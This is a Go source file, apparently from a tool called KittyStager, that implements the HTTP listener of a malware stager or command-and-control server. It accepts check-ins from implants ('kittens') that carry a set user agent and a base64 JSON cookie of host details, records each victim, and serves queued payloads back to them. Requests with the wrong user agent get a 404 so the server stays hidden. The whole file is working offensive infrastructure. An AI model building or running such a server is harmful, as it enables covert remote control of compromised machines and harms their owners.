package http

import (
	"KittyStager/cmd/config"
	"KittyStager/cmd/httpUtil"
	"KittyStager/cmd/util"
	b64 "encoding/base64"
	"fmt"
	color "github.com/logrusorgru/aurora"
	"net/http"
	"time"
)

var (
	userA    string
	defSleep int
)

func CreateHttpServer(conf config.General) {
	httpUtil.Targets = make(map[string]*httpUtil.Kitten)
	defSleep = conf.GetSleep()
	address := fmt.Sprintf("%s:%d", conf.GetHost(), conf.GetPort())
	userA = conf.GetUserAgent()
	fmt.Printf("%s %s\n\n", color.Green("[+] Started http server on"), color.Yellow(address))
	http.HandleFunc(conf.GetEndpoint(), logRequest)
	err := http.ListenAndServe(address, nil)
	if err != nil {
		util.ErrPrint(err)
		return
	}
}

// Logs the requests from the beacons
func logRequest(w http.ResponseWriter, r *http.Request) {
	var c util.InitialChecks
	userAgent := r.UserAgent()
	//check if the user agent is correct
	if userAgent != userA {
		w.WriteHeader(404)
		fmt.Printf("\n%s\n", color.Yellow("[!] Unauthorized user agent: "+userAgent))
		return
	}
	cookie := r.Header.Get("Cookie")
	//check if the cookie is initial callback
	if len(cookie) > 50 {
		out, err := b64.StdEncoding.DecodeString(cookie)
		if err != nil {
			util.ErrPrint(err)
			return
		}
		c, err = util.UnmarshalJSON(out)
		//If the beacon is not in the map, add it
		fmt.Printf("\n%s %s\n", color.Green("[+] Request from:"), color.Yellow(c.GetIp()))
		fmt.Printf("%s %s\n", color.Green("[+] Kitten name:"), color.Yellow(c.GetKittenName()))
		fmt.Printf("%s %s\n", color.Green("[+] User-Agent:"), color.Yellow(r.UserAgent()))

		httpUtil.Targets[c.KittenName] = &httpUtil.Kitten{
			Name:       c.GetKittenName(),
			Id:         len(httpUtil.Targets),
			LastSeen:   time.Now(),
			Sleep:      defSleep,
			Alive:      true,
			InitChecks: c,
		}
		_, err = w.Write(httpUtil.Targets[c.GetKittenName()].GetPayload())
		if err != nil {
			return
		}
		err = util.PrintCookie(out)
		if err != nil {
			fmt.Println(color.Red("Error printing cookie"))
			return
		}
		// regular callback
	} else {
		kittenName := cookie
		if _, ok := httpUtil.Targets[kittenName]; ok {
			_, err := w.Write(httpUtil.Targets[kittenName].GetPayload())
			httpUtil.Targets[kittenName].SetLastSeen(time.Now())
			if err != nil {
				return
			}
			httpUtil.Targets[kittenName].SetPayload(nil)
			return
		}
	}
}
